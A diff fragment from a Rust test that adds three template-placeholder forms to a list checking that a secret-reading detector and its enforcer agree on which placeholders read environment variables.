     fn the_confined_refusal_set_is_exactly_what_the_env_pass_would_read() {
         // The detector-vs-enforcer check. For each form, ask the shipped
         // fleet-wide pass whether it reads the environment (its output
@@ -850,6 +1413,16 @@ mod tests {
             format!("${{args.{SECRET_VAR}}}"),
             format!("${{steps.fetch.{SECRET_VAR}}}"),
             "${method}".to_string(),
+            // The three forms the two sides used to disagree on, which
+            // is the whole point of a biconditional and which the first
+            // version of this test did not contain (WOR-2433 review).
+            // `${}` lost its closing brace on the enforcer side;
+            // `${request.header.X}` and `${attribution.X}` are
+            // documented access-log runtime vocabulary that the confined
+            // pass refused as process variables.
+            "${}".to_string(),
+            "${request.header.X-Request-Id}".to_string(),
+            "${attribution.team}".to_string(),
             "plain text with no placeholder".to_string(),
         ];
         for form in &forms {
